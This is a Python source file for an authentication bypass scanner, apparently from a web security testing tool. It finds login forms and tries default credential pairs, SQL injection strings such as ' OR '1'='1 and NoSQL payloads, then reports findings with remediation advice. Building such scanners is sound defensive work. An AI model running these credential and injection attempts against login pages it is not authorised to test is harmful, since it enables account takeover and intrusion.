import asyncio
import urllib.parse
import re
from bs4 import BeautifulSoup
from .base import BaseScanner
from common import TestingZone, event_manager


class AuthBypassScanner(BaseScanner):
    """
    Authentication Bypass Scanner.
    
    Tests various authentication bypass techniques:
    - Default credentials
    - SQL injection in login forms
    - NoSQL injection
    - XPath/LDAP injection
    - Response manipulation detection
    - Parameter removal/manipulation
    """
    
    def __init__(self, context):
        super().__init__(context)
        self.zone = TestingZone.ZONE_A
        self.name = "AuthBypassScanner"
        
    async def run(self):
        await event_manager.emit("log", f"[{self.name}] Starting Authentication Bypass scan...")
        
        # Load payloads
        default_creds = self.load_payloads("auth/default_creds.txt", limit=20)
        sqli_payloads = self.load_payloads("auth/sqli_bypass.txt", limit=15)
        nosqli_payloads = self.load_payloads("auth/nosqli_bypass.txt", limit=10)
        
        # Fallback defaults
        if not default_creds:
            default_creds = ["admin:admin", "admin:password", "root:root", "test:test"]
        if not sqli_payloads:
            sqli_payloads = ["' OR '1'='1", "admin'--", "' OR 1=1--"]
        
        urls_to_scan = self.context.crawled_urls if self.context.crawled_urls else {self.context.target}
        
        # Find login forms
        login_forms = []
        for url in list(urls_to_scan)[:50]:
            forms = await self._find_login_forms(url)
            login_forms.extend(forms)
        
        if not login_forms:
            # Check common login paths
            base_url = self.context.target.rstrip('/')
            login_paths = ["/login", "/signin", "/auth", "/admin", "/user/login",
                          "/account/login", "/wp-login.php", "/administrator"]
            for path in login_paths:
                test_url = f"{base_url}{path}"
                forms = await self._find_login_forms(test_url)
                login_forms.extend(forms)
        
        if not login_forms:
            await event_manager.emit("log", f"[{self.name}] No login forms found. Scan complete.")
            return
        
        await event_manager.emit("log", f"[{self.name}] Found {len(login_forms)} login forms. Testing bypasses...")
        
        for form_data in login_forms[:5]:  # Limit forms to test
            # Test default credentials
            await self.test_default_credentials(form_data, default_creds)
            # Test SQL injection
            await self.test_sqli_bypass(form_data, sqli_payloads)
            # Test NoSQL injection
            await self.test_nosqli_bypass(form_data, nosqli_payloads)
            # Test response manipulation vulnerability
            await self.check_response_manipulation(form_data)
        
        await event_manager.emit("log", f"[{self.name}] Scan complete.")
    
    async def _find_login_forms(self, url):
        """Find login forms on a page."""
        forms = []
        try:
            async with self.context.session.get(url, timeout=15) as response:
                if response.status != 200:
                    return forms
                html = await response.text()
                soup = BeautifulSoup(html, 'html.parser')
                
                for form in soup.find_all('form'):
                    # Check if it looks like a login form
                    inputs = form.find_all(['input'])
                    has_password = any(
                        i.get('type', '').lower() == 'password' or 
                        'pass' in i.get('name', '').lower()
                        for i in inputs
                    )
                    has_username = any(
                        i.get('type', '').lower() in ['text', 'email'] or
                        any(x in i.get('name', '').lower() for x in ['user', 'email', 'login', 'name'])
                        for i in inputs
                    )
                    
                    if has_password and has_username:
                        action = form.get('action', '')
                        action_url = urllib.parse.urljoin(url, action) if action else url
                        method = form.get('method', 'post').lower()
                        
                        # Extract input fields
                        fields = {}
                        username_field = None
                        password_field = None
                        
                        for inp in inputs:
                            name = inp.get('name')
                            if not name:
                                continue
                            
                            inp_type = inp.get('type', 'text').lower()
                            if inp_type == 'password' or 'pass' in name.lower():
                                password_field = name
                                fields[name] = ''
                            elif inp_type in ['text', 'email'] or any(x in name.lower() for x in ['user', 'email', 'login']):
                                username_field = name
                                fields[name] = ''
                            elif inp_type == 'hidden':
                                fields[name] = inp.get('value', '')
                            elif inp_type not in ['submit', 'button', 'image']:
                                fields[name] = inp.get('value', '')
                        
                        if username_field and password_field:
                            forms.append({
                                'url': action_url,
                                'source_url': url,
                                'method': method,
                                'fields': fields,
                                'username_field': username_field,
                                'password_field': password_field
                            })
        except Exception:
            pass
        return forms
    
    async def test_default_credentials(self, form_data, credentials):
        """Test default username:password combinations."""
        for cred in credentials:
            if ':' not in cred:
                continue
            username, password = cred.split(':', 1)
            
            data = form_data['fields'].copy()
            data[form_data['username_field']] = username
            data[form_data['password_field']] = password
            
            try:
                if form_data['method'] == 'post':
                    async with self.context.session.post(
                        form_data['url'], data=data, 
                        allow_redirects=True, timeout=15
                    ) as response:
                        if await self._check_login_success(response):
                            await self.emit_vulnerability(
                                "Default Credentials",
                                f"Login successful with default credentials.\nUsername: {username}\nPassword: {password}",
                                severity="P1",
                                remediation="Change default credentials immediately. Implement password policies.",
                                url=form_data['source_url'],
                                payload=f"{username}:{password}",
                                confidence=0.97,
                                observed_behavior="Authentication succeeded with a known default credential pair.",
                                verification="direct",
                                reproduction_steps=[
                                    "Open the login form.",
                                    "Submit the reported default credential pair.",
                                    "Confirm the authenticated landing page or session state appears.",
                                ],
                            )
                            return
            except Exception:
                pass
    
    async def test_sqli_bypass(self, form_data, payloads):
        """Test SQL injection authentication bypass."""
        for payload in payloads:
            # Test in username field
            data = form_data['fields'].copy()
            data[form_data['username_field']] = payload
            data[form_data['password_field']] = 'anything'
            
            try:
                if form_data['method'] == 'post':
                    async with self.context.session.post(
                        form_data['url'], data=data,
                        allow_redirects=True, timeout=15
                    ) as response:
                        text = await response.text()
                        # Check for SQL errors (indicates vulnerability)
                        sql_errors = ["SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "sqlite"]
                        if any(err.lower() in text.lower() for err in sql_errors):
                            await self.emit_vulnerability(
                                "SQL Injection",
                                f"SQL injection detected in login form.\nPayload: {payload}",
                                severity="P2",
                                remediation="Use parameterized queries. Never concatenate user input into SQL.",
                                url=form_data['source_url'],
                                payload=payload,
                                confidence=0.7,
                                observed_behavior="Login response exposed SQL error markers.",
                                verification="heuristic",
                                reproduction_steps=[
                                    "Open the login form.",
                                    "Submit the reported payload in the username field.",
                                    "Confirm SQL error markers appear before treating it as an exploit.",
                                ],
                            )
                            return
                        
                        # Check for successful bypass
                        if await self._check_login_success(response, text):
                            await self.emit_vulnerability(
                                "Authentication Bypass",
                                f"Authentication bypassed using SQL injection.\nPayload: {payload}",
                                severity="P1",
                                remediation="Use parameterized queries. Implement proper input validation.",
                                url=form_data['source_url'],
                                payload=payload,
                                confidence=0.96,
                                observed_behavior="Login succeeded after SQL injection payload submission.",
                                verification="direct",
                                reproduction_steps=[
                                    "Open the login form.",
                                    "Submit the SQL injection payload in the username field.",
                                    "Confirm the application grants authenticated access.",
                                ],
                            )
                            return
            except Exception:
                pass
    
    async def test_nosqli_bypass(self, form_data, payloads):
        """Test NoSQL injection authentication bypass."""
        for payload in payloads:
            data = form_data['fields'].copy()
            data[form_data['username_field']] = payload
            data[form_data['password_field']] = 'anything'
            
            try:
                if form_data['method'] == 'post':
                    async with self.context.session.post(
                        form_data['url'], data=data,
                        allow_redirects=True, timeout=15
                    ) as response:
                        if await self._check_login_success(response):
                            await self.emit_vulnerability(
                                "NoSQL Injection",
                                f"Authentication bypassed using NoSQL injection.\nPayload: {payload}",
                                severity="P1",
                                remediation="Sanitize all inputs. Use type checking. Avoid evaluating user input.",
                                url=form_data['source_url'],
                                payload=payload,
                                confidence=0.95,
                                observed_behavior="Login succeeded after NoSQL-style payload submission.",
                                verification="direct",
                                reproduction_steps=[
                                    "Open the login form.",
                                    "Submit the reported NoSQL payload.",
                                    "Confirm authenticated access is granted unexpectedly.",
                                ],
                            )
                            return
            except Exception:
                pass
    
    async def check_response_manipulation(self, form_data):
        """Check if response manipulation could bypass authentication."""
        data = form_data['fields'].copy()
        data[form_data['username_field']] = 'testuser'
        data[form_data['password_field']] = 'wrongpassword'
        
        try:
            if form_data['method'] == 'post':
                async with self.context.session.post(
                    form_data['url'], data=data,
                    allow_redirects=False, timeout=15
                ) as response:
                    text = await response.text()
                    
                    # Check for response patterns that could be manipulated
                    manipulation_patterns = [
                        (r'"success"\s*:\s*false', "success: false"),
                        (r'"authenticated"\s*:\s*false', "authenticated: false"),
                        (r'"loggedIn"\s*:\s*false', "loggedIn: false"),
                        (r'"valid"\s*:\s*false', "valid: false"),
                        (r'"status"\s*:\s*"?(failed|error)', "status: failed"),
                    ]
                    
                    for pattern, description in manipulation_patterns:
                        if re.search(pattern, text, re.IGNORECASE):
                            await self.emit_vulnerability(
                                "Auth Issue",
                                f"Response contains manipulatable authentication check.\nPattern: {description}\nA client-side attacker could modify this response to bypass authentication.",
                                severity="P4",
                                remediation="Never rely on client-side response data for authentication. Validate server-side.",
                                url=form_data['source_url'],
                                payload=description,
                                confidence=0.6,
                                observed_behavior="Response body exposes client-side auth state markers.",
                                verification="heuristic",
                                reproduction_steps=[
                                    "Inspect the login response body.",
                                    "Locate the exposed client-side auth marker.",
                                    "Confirm the server still validates authorization after remediation.",
                                ],
                            )
                            return
        except Exception:
            pass
    
    async def _check_login_success(self, response, text=None):
        """Determine if a login attempt was successful."""
        if text is None:
            text = await response.text()
        
        # Check for common success indicators
        success_indicators = [
            "dashboard", "welcome", "logout", "my account", "profile",
            "you are logged in", "login successful", "authenticated"
        ]
        failure_indicators = [
            "invalid", "incorrect", "wrong", "failed", "error",
            "try again", "denied", "unauthorized"
        ]
        
        text_lower = text.lower()
        
        # Check URL for dashboard/account redirects
        if hasattr(response, 'url'):
            url_str = str(response.url).lower()
            if any(ind in url_str for ind in ['dashboard', 'account', 'profile', 'home']):
                return True
        
        # Check content
        has_success = any(ind in text_lower for ind in success_indicators)
        has_failure = any(ind in text_lower for ind in failure_indicators)
        
        return has_success and not has_failure
